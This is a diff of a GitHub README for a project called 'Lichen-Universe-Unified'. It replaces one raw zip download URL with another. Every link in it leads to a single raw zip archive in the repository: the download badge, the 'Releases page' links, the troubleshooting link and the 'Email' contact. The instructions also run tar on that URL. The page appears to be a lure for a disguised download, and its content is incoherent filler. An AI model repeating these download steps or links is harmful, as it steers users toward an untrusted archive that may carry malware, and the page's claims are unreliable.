@@ -1,6 +1,6 @@
 # 🌌 Lichen-Universe-Unified - Explore a New Open Source Ecosystem
 
-[![Download Lichen-Universe-Unified](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip)](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip)
+[![Download Lichen-Universe-Unified](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip)](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ Before you download, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To download Lichen-Universe-Unified, visit [this page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip) and follow these steps:
+To download Lichen-Universe-Unified, visit [this page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip) and follow these steps:
 
 1. Locate the latest version listed on the Releases page.
 2. Choose the download that matches your operating system.
@@ -47,9 +47,9 @@ After downloading, follow these installation steps:
 
 ### For Linux:
 
-1. Locate the downloaded `https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip` file in your Downloads folder.
 2. Open a terminal and navigate to your Downloads folder.
-3. Extract the files using the command: `tar -xvzf https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip`.
+3. Extract the files using the command: `tar -xvzf https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip`.
 4. Follow the provided README file for specific installation steps.
 
 ## 📊 Features
@@ -82,7 +82,7 @@ Each area presents unique projects designed to explore the potential of these fi
 If you encounter issues during installation or while using the application, consider the following solutions:
 
 - **Installation Fails**: Ensure your system meets the requirements. If necessary, free up space or check for permission settings.
-- **Application Crashes**: Make sure you have the latest version. Check for updates on the [Releases page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip).
+- **Application Crashes**: Make sure you have the latest version. Check for updates on the [Releases page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip).
 - **Networking Issues**: Verify your internet connection and retry any online features.
 
 For further assistance, you can check out the issues section in this repository, or open a new issue if you need direct support.
@@ -91,11 +91,11 @@ For further assistance, you can check out the issues section in this repository,
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip
+- **Email**: https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip
 - **GitHub Issues**: Use the issues tab to report bugs or request features.
 
 ## 🌍 Join the Community
 
 Become part of the Lichen-Universe community. Collaborate with other users, share your ideas, and contribute to ongoing projects. Together, we can shape the future of technology.
 
-Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/Ouellet404/Unified_Lichen_Universe_1.2-alpha.5.zip) to download the latest version and explore all that Lichen-Universe-Unified has to offer!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Aditya11211/Lichen-Universe-Unified/main/lichen-consciousness-engine/core/Unified_Universe_Lichen_v1.4.zip) to download the latest version and explore all that Lichen-Universe-Unified has to offer!
